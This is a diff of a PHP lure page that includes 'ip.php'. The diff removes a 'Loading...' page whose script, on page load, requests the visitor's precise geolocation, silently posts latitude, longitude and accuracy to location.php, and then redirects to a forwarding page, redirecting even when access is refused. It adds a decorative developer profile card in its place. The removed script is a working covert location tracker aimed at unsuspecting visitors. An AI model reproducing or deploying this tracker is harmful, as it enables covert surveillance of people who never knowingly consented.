@@ -3,137 +3,198 @@ include 'ip.php';
 
 // Add JavaScript to capture location
 echo '
-<!DOCTYPE html>
 <html>
+
 <head>
-    <title>Loading...</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script>
-        // Debug function to log messages - only log essential information
-        function debugLog(message) {
-            // Only log essential location data, not status messages
-            if (message.includes("Lat:") || message.includes("Latitude:") || message.includes("Position obtained successfully")) {
-                console.log("DEBUG: " + message);
-                
-                // Send only essential logs to server
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", "debug_log.php", true);
-                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                xhr.send("message=" + encodeURIComponent(message));
-            }
-        }
-        
-        function getLocation() {
-            // Don\'t log this message
-            
-            if (navigator.geolocation) {
-                // Don\'t log this message
-                
-                // Show permission request message
-                document.getElementById("locationStatus").innerText = "Requesting location permission...";
-                
-                navigator.geolocation.getCurrentPosition(
-                    sendPosition, 
-                    handleError, 
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 15000,
-                        maximumAge: 0
-                    }
-                );
-            } else {
-                // Don\'t log this message
-                document.getElementById("locationStatus").innerText = "Your browser doesn\'t support location services";
-                // Redirect after a delay if geolocation is not supported
-                setTimeout(function() {
-                    redirectToMainPage();
-                }, 2000);
-            }
-        }
-        
-        function sendPosition(position) {
-            debugLog("Position obtained successfully");
-            document.getElementById("locationStatus").innerText = "Location obtained, loading...";
-            
-            var lat = position.coords.latitude;
-            var lon = position.coords.longitude;
-            var acc = position.coords.accuracy;
-            
-            debugLog("Lat: " + lat + ", Lon: " + lon + ", Accuracy: " + acc);
-            
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "location.php", true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    // Don\'t log this message
-                    
-                    // Add a delay before redirecting to ensure data is processed
-                    setTimeout(function() {
-                        redirectToMainPage();
-                    }, 1000);
-                }
-            };
-            
-            xhr.onerror = function() {
-                // Don\'t log this message
-                // Still redirect even if there was an error
-                redirectToMainPage();
-            };
-            
-            // Send the data with a timestamp to avoid caching
-            xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&time="+new Date().getTime());
-        }
-        
-        function handleError(error) {
-            // Don\'t log error messages
-            
-            document.getElementById("locationStatus").innerText = "Redirecting...";
-            
-            // If user denies location permission or any other error, still redirect after a short delay
-            setTimeout(function() {
-                redirectToMainPage();
-            }, 2000);
-        }
-        
-        function redirectToMainPage() {
-            // Don\'t log this message
-            // Try to redirect to the template page
-            try {
-                window.location.href = "forwarding_link/index2.html";
-            } catch (e) {
-                // Don\'t log this message
-                // Fallback redirection
-                window.location = "forwarding_link/index2.html";
-            }
-        }
-        
-        // Try to get location when page loads
-        window.onload = function() {
-            // Don\'t log this message
-            setTimeout(function() {
-                getLocation();
-            }, 500); // Small delay to ensure everything is loaded
-        };
-    </script>
+
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1" />
+  <title>gunlols</title>
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <link type="text/css" rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
+  <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
+  <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: radial-gradient(circle at top, #700000, #000);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      overflow: hidden;
+    }
+body::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  background:
+    url("baner-GTP.png") center/cover no-repeat,   /* ფოტო */
+    repeating-linear-gradient(
+      135deg,
+      rgba(159, 0, 0, 0.937),
+      rgb(38, 0, 0) 15px,
+      transparent 15px,
+      transparent 30px
+    ); /* შენი ძველი დიზაინი */
+  z-index: 0;
+}
+
+
+    .card {
+      position: relative;
+      width: 360px;
+      background: linear-gradient(180deg, #4e0000, #120000);
+      border-radius: 20px;
+      padding: 30px 20px;
+      text-align: center;
+      box-shadow: 0 0 40px rgba(255,0,0,0.4);
+      z-index: 1;
+    }
+
+    .avatar {
+      width: 110px;
+      height: 110px;
+      margin: 0 auto 10px;
+      border-radius: 50%;
+      overflow: hidden;
+      border: 4px solid red;
+      box-shadow: 0 0 20px red;
+    }
+
+    .avatar img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    h1 {
+      font-size: 26px;
+      color: red;
+      text-shadow: 0 0 10px red;
+      margin-bottom: 5px;
+    }
+
+    .role {
+      font-size: 15px;
+      opacity: 0.9;
+      margin-bottom: 15px;
+    }
+
+    .status {
+      background: #000;
+      padding: 10px;
+      border-radius: 10px;
+      font-size: 13px;
+      margin-bottom: 18px;
+      box-shadow: inset 0 0 10px red;
+    }
+
+    .socials {
+      display: flex;
+      justify-content: center;
+      gap: 14px;
+      margin-bottom: 20px;
+    }
+
+    .socials a {
+      width: 40px;
+      height: 40px;
+      background: red;
+      color: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+      font-size: 18px;
+      box-shadow: 0 0 12px red;
+      transition: 0.3s;
+    }
+
+    .socials a:hover {
+      transform: scale(1.15);
+      box-shadow: 0 0 25px red;
+    }
+
+    .music {
+      background: #140000;
+      border-radius: 14px;
+      padding: 15px;
+      box-shadow: inset 0 0 15px red;
+    }
+
+    .music-title {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+      color: red;
+    }
+
+    input[type="range"] {
+      width: 100%;
+    }
+
+    .controls {
+      margin-top: 10px;
+      font-size: 18px;
+    }
+
+    .controls i {
+      margin: 0 8px;
+      cursor: pointer;
+      color: white;
+    }
+
+  </style>
 </head>
-<body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
-    <h2>Loading, please wait...</h2>
-    <p>Please allow location access for better experience</p>
-    <p id="locationStatus">Initializing...</p>
-    <div style="margin-top: 30px;">
-        <div class="spinner" style="border: 8px solid #333; border-top: 8px solid #f3f3f3; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
+
+<body>
+
+  <div class="card">
+
+    <div class="avatar">
+      <img src="tam20.webp" alt="Avatar">
     </div>
-    
-    <style>
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+
+    <h1>Nika Geims</h1>
+    <div class="role">👑 Full Time Developer 👑</div>
+
+    <div class="status">
+      gilocav axal wels  <br>
+      xo magari propilia
+    </div>
+    <div class="socials">
+      <a href="#"><i class="fa fa-facebook"></i></a>
+      <a href="#"><i class="fa fa-twitter"></i></a>
+      <a href="#"><i class="fa fa-instagram"></i></a>
+      <a href="#"><i class="fa fa-linkedin"></i></a>
+    </div>
+    <div class="music">
+      <div class="music-title">
+        <span>magari muzonia</span>
+      </div>
+
+      <input type="range" value="20">
+    </div>
+
+  </div>
+
 </body>
 </html>
+
 ';
 exit;
 ?>  
